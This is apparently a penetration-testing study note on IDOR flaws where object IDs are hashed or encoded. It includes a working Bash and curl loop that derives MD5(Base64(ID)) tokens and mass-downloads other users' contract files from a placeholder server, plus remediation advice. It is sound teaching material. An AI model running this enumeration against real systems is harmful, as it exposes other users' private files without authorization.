
# IDOR - Encoded & Hashed Object References

## 🧠 Overview

Many applications attempt to "secure" direct object references by encoding or hashing them (e.g., `uid=c4ca4238a0b923820dcc509a6f75849b` instead of `uid=1`). This is a classic case of **Security through Obscurity**.

➡️ **The Rule:** If an attacker can predict or reproduce the algorithm used to generate the reference, the IDOR vulnerability remains fully exploitable.

---

## 🔍 Identifying the Pattern

When you see a parameter that looks like a random string, you need to determine if it's a **Fixed Hash** (predictable) or a **Secure UUID** (unpredictable).

### 🧪 Step 1: Baseline Analysis

1. Create a user and check your ID: `uid=1`.
2. Look at the request: `contract=cdd96d3cc73d1dbdaffa03cc6cd7339b`.
3. Try to identify the hash type (e.g., MD5 is 32 chars, SHA-1 is 40 chars).

### 🧪 Step 2: Reverse Engineering (White/Gray Box)

Search the frontend JavaScript files for the parameter name (`contract` or `uid`).

```javascript
// Example found in main.js
function getFile(id) {
    var token = CryptoJS.MD5(btoa(id)).toString();
    window.location.href = "/download.php?contract=" + token;
}

```

👉 **Logic found:** `MD5(Base64(ID))`.

---

## 🚀 Exploitation & Mass Enumeration

### 1. Manual Verification

Before automating, verify the logic for `uid=2`:

```bash
echo -n 2 | base64 | md5sum
# Result: ebb060303a1da6034032d84715f01e8c

```

If you send `contract=ebb0...` and you get User 2's file, the IDOR is confirmed.

### 2. Mass Enumeration Script

We can use a simple Bash loop to scrape multiple files at once.

```bash
#!/bin/bash

# Target URL
URL="http://SERVER_IP:PORT/download.php"

for i in {1..20}; do
    # 1. Generate the hashed reference
    # tr -d ' -' cleans the md5sum output
    hash=$(echo -n $i | base64 -w 0 | md5sum | tr -d ' -')
    
    # 2. Download the file
    echo "[*] Attempting UID $i with hash $hash"
    curl -s -X POST -d "contract=$hash" "$URL" -o "contract_$i.pdf"
    
    # 3. Validation (Check if file is empty or 404)
    if [ ! -s "contract_$i.pdf" ]; then
        rm "contract_$i.pdf"
    fi
done

```

---

## 🛠️ Other Common Encodings

| Encoding/Hash | Appearance | Example (ID 1) |
| --- | --- | --- |
| **Base64** | Ends in `=` or `==` | `MQ==` |
| **URL Encoding** | Uses `%` | `%31` |
| **MD5** | 32 Hex characters | `c4ca4238a0b923820dcc509a6f75849b` |
| **Hex** | Pair of hex values | `31` |
| **Custom** | Rot13, XOR, etc. | `n` (Rot13 of `1`) |

---

## 🛡️ Secure Implementation

* **Server-Side Authorization:** This is the ONLY real fix. The server must check: *"Does User A have permission to see Contract X?"* regardless of the ID format.
* **UUIDv4:** Use Universally Unique Identifiers. They are 128-bit random numbers that are virtually impossible to guess.
* *Good:* `uid=550e8400-e29b-41d4-a716-446655440000`


* **Signed Tokens (HMAC):** If you must use IDs, sign them with a secret key so the user cannot modify them.

---

## 💣 Pentester Mindset

* **The "Small Integer" Trap:** Developers often hash IDs because the database still uses sequential integers. Always test if `1`, `2`, `3` are the seeds for those hashes.
* **Check the Cookie:** Sometimes the IDOR is not in the URL, but in a hashed `user_id` inside the Cookie or a JWT.
* **Burp Suite "Hasher":** Use the Burp extension *Hasher* or *Intruder's* payloads to automatically generate MD5/Base64 sequences for you.
